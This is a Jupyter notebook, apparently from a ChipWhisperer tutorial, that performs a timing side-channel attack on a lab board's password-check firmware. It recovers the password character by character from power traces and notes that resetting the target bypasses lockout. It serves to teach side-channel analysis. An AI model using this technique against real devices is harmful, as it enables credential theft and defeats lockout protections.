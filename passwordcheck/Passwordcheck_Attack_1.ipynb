{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Attack Password with Timing Analysis (Attack)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hide_input": true
   },
   "outputs": [],
   "source": [
    "%run '../helper_scripts/Metadata.ipynb'\n",
    "print_metadata()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "toc": true
   },
   "source": [
    "<h1>Table of Contents<span class=\"tocSkip\"></span></h1>\n",
    "<div class=\"toc\"><ul class=\"toc-item\"><li><span><a href=\"#Basic-Setup\" data-toc-modified-id=\"Basic-Setup-1\"><span class=\"toc-item-num\">1&nbsp;&nbsp;</span>Basic Setup</a></span></li><li><span><a href=\"#Helper-Functions-for-Password-Attack\" data-toc-modified-id=\"Helper-Functions-for-Password-Attack-2\"><span class=\"toc-item-num\">2&nbsp;&nbsp;</span>Helper Functions for Password Attack</a></span></li><li><span><a href=\"#Timing-Analysis\" data-toc-modified-id=\"Timing-Analysis-3\"><span class=\"toc-item-num\">3&nbsp;&nbsp;</span>Timing Analysis</a></span></li><li><span><a href=\"#Trace-a-Password-attempt\" data-toc-modified-id=\"Trace-a-Password-attempt-4\"><span class=\"toc-item-num\">4&nbsp;&nbsp;</span>Trace a Password attempt</a></span></li><li><span><a href=\"#Comparing-multiple-attempts\" data-toc-modified-id=\"Comparing-multiple-attempts-5\"><span class=\"toc-item-num\">5&nbsp;&nbsp;</span>Comparing multiple attempts</a></span></li><li><span><a href=\"#Attacking-a-Single-Letter\" data-toc-modified-id=\"Attacking-a-Single-Letter-6\"><span class=\"toc-item-num\">6&nbsp;&nbsp;</span>Attacking a Single Letter</a></span></li><li><span><a href=\"#Attacking-the-Full-Password\" data-toc-modified-id=\"Attacking-the-Full-Password-7\"><span class=\"toc-item-num\">7&nbsp;&nbsp;</span>Attacking the Full Password</a></span></li><li><span><a href=\"#Tests\" data-toc-modified-id=\"Tests-8\"><span class=\"toc-item-num\">8&nbsp;&nbsp;</span>Tests</a></span></li><li><span><a href=\"#Disconnect\" data-toc-modified-id=\"Disconnect-9\"><span class=\"toc-item-num\">9&nbsp;&nbsp;</span>Disconnect</a></span></li></ul></div>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Basic Setup"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define Variables"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"Init.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Build target and upload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "TARGET = 'basic-passwdcheck'\n",
    "%store TARGET\n",
    "%run \"Passwordcheck_Prepare.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Import helper functions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%run \"../helper_scripts/Setup_Generic.ipynb\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Setup is the same as usual, except this time we'll be capturing 2000 traces."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.adc.samples = 2000"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Helper Functions for Password Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As was mentioned at the beginning of the tutorial, the firmware we loaded onto the target implements a basic password check. After getting a `'\\n'` terminated password, the target checks it and enters an infinite loop, so before communicating with it, we'll need to reset it.\n",
    "\n",
    "We'll be doing this a lot, so we'll define a function that resets the target (this function is also available by running \"Helper_Scripts/Setup.ipynb\" as we did above):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from bokeh.plotting import figure, show \n",
    "from bokeh.io import output_notebook\n",
    "from bokeh.models import CrosshairTool\n",
    "\n",
    "output_notebook()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def cap_pass_trace(pass_guess, fPrint = False):\n",
    "    ret = \"\"\n",
    "    reset_target(scope)\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 10)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "\n",
    "    if fPrint == True:\n",
    "        print(ret)\n",
    "    \n",
    "    scope.arm()\n",
    "    target.flush()\n",
    "    target.write(pass_guess)\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "\n",
    "    trace = scope.get_last_trace()\n",
    "    \n",
    "    ret = \"\"\n",
    "    num_char = target.in_waiting()\n",
    "    while num_char > 0:\n",
    "        ret += target.read(num_char, 10)\n",
    "        time.sleep(0.01)\n",
    "        num_char = target.in_waiting()\n",
    "    \n",
    "    return trace, ret"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**NOTE**\n",
    "The text may appear cutoff, accompanied by a message about data loss. This means that the buffer used to store serial data (128 bytes) from the target is full. This isn't an issue here, since the text is just aesthetic, but keep this in mind if you want to do large transfers of serial data using ChipWhisperer. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Timing Analysis"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Trace a Password attempt\n",
    "It is easy to trace a single password attempt."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputbuf = \"\"\n",
    "trace, outputbuf = cap_pass_trace(\"a\\n\", True)\n",
    "x_range = range(0, len(trace))\n",
    "p = figure()\n",
    "p.add_tools(CrosshairTool())\n",
    "p.line(x_range, trace)\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Comparing multiple attempts\n",
    "Now let's trace multiple password attempts where we use different parts of the \"real\" password which can be found in `./basic-passwordcheck.c`. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "partly_password_traces = []\n",
    "for attempt in ('a', 'i', 'ifa'):\n",
    "    trace, _ = cap_pass_trace(attempt + '\\n', False)\n",
    "    partly_password_traces.append(trace)\n",
    "p = figure()\n",
    "p.add_tools(CrosshairTool())\n",
    "for i, trace in enumerate(partly_password_traces):\n",
    "    p.line(range(len(trace)), trace + i * 0.6)\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We can see that the traces look a bit different and the last peek downwards is moving to the right the more characters of the password are right. We can even see this more clearly if we modify the view a bit:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy\n",
    "p = figure()\n",
    "p.add_tools(CrosshairTool())\n",
    "for i, trace in enumerate(partly_password_traces):\n",
    "    p.line(range(500), numpy.array([t if t > 0.4 else 0.5 * t for t in abs(trace)[:500]]) + i * 0.5)\n",
    "show(p)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now it is easy to see that the peak at 289 moves with an increment of 40 to the right with each right character.\n",
    "\n",
    "It is possible that the exact values vary in your setup."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attacking a Single Letter"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The plan for the attack is simple: keep guessing letters until we no longer see the distinctive spike in the original location. To do this, we'll create a loop that:\n",
    "\n",
    "* Figures out our next guess\n",
    "* Does the capture and records the trace\n",
    "* Checks if sample 289 is larger than -0.3 (replace with appropriate values)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def checkpass(trace, i):\n",
    "    return trace[137 + 40 * i] > -0.4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The below loop finds the first correct character, prints it, then ends. You should see \"Success: I\" after a while."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "trylist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "password = ''\n",
    "outputbuf = ''\n",
    "for c in trylist:\n",
    "    next_pass = password + c + \"\\n\"\n",
    "    trace, outputbuf = cap_pass_trace(next_pass)\n",
    "    if checkpass(trace, 0):\n",
    "        print(\"Success: \" + c)\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attacking the Full Password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we can guess a single character, attacking the rest is easy; we just need to repeat the process in another loop, move the check point (this is the change is location you recorded earlier), and update our guess with the new correct letter.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "trylist = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n",
    "password = \"\"\n",
    "outputbuf = \"\"\n",
    "for i in range(7):\n",
    "    for c in trylist:\n",
    "        next_pass = password + c + \"\\n\"\n",
    "        trace, outputbuf = cap_pass_trace(next_pass)\n",
    "        if checkpass(trace, i):\n",
    "            password += c\n",
    "            print(\"Success {}, pass now {}\".format(i, password))\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "That's it! You should have successfully cracked a password using the timing attack. Some notes on this method:\n",
    "\n",
    "* The current script doesn't look for the \"WELCOME\" message when the password is OK. That is an extension that allows it to crack any size password.\n",
    "* If there was a lock-out on a wrong password, the system would ignore it, as it resets the target after every attempt."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputbuf = \"\"\n",
    "trace, outputbuf = cap_pass_trace(password + '\\n', True)\n",
    "print (outputbuf)\n",
    "if \"Welcome\" not in outputbuf:\n",
    "    print(\"Failed to break password, got {}.\\n\".format(password))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Disconnect"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": true,
   "toc_position": {},
   "toc_section_display": true,
   "toc_window_display": true
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
